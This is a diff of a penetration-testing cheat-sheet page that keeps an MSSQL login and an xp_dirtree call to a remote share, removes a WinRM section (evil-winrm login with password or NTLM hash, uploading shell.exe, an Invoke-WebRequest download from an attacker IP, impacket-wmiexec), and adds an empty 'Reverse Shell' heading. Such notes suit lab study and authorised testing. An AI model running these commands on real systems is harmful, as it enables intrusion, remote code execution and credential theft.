@@ -25,7 +25,7 @@ nav_order: 1433
 
 ---
 
-## 1. Login
+## Login
 
 ```bash
 impacket-mssqlclient Administrator:Password@192.168.50.18 -windows-auth
@@ -106,108 +106,16 @@ exec xp_dirtree '\\192.168.45.186\test';
 
 ---
 
-## 2. Example
 
-👉 Usually limited without credentials
+# Reverse Shell
 
-```bash
-curl -I http://<IP>:5985
-```
+👉 Try:
 
----
-
-## 3. Access / Interaction
-
-### With Credentials
-
-```bash
-evil-winrm -i <IP> -u <USER> -p <PASS>
-```
+* 
 
 ---
 
-### With Hash
-
-```bash
-evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
-```
-
----
-
-## 4. Credential Hunting
-
-👉 Credentials usually come from:
-
-* [SMB](smb.md)
-* [HTTP](http.md)
-* [MSSQL](mssql.md)
-* Password attacks → [Password Attacks](../03_initial_access/password_attacks.md)
-### File Transfer (Upload / Download)
-
-👉 Primary method: evil-winrm built-in transfer
-
-#### Download (Target → Attacker)
-```zsh
-download file.txt
-```
-
-```zsh
-download C:\Users\<USER>\Desktop\file.txt
-```
-
-#### Upload (Attacker → Target)
-```zsh
-upload shell.exe
-```
-
-```zsh
-upload exploit.ps1 C:\Temp\exploit.ps1
-```
-Fallback Transfer (PowerShell)
-```powershell
-Invoke-WebRequest http://<ATTACKER_IP>/file.exe -OutFile C:\Temp\file.exe
-```
-
----
-
-## 5. Authenticated Actions
-
-👉 Once connected:
-
-```powershell
-whoami
-hostname
-ipconfig
-```
-
----
-
-👉 Check privileges:
-
-```powershell
-whoami /priv
-```
-
----
-
-## 6. Remote Execution / Exploitation
-
-👉 WinRM itself = execution channel
-
-👉 If access works:
-→ Direct shell obtained
-
----
-
-👉 Alternative (Impacket):
-
-```bash
-impacket-wmiexec <USER>:<PASS>@<IP>
-```
-
----
-
-## 7. No Credentials?
+# 7. No Credentials?
 
 👉 Try:
 
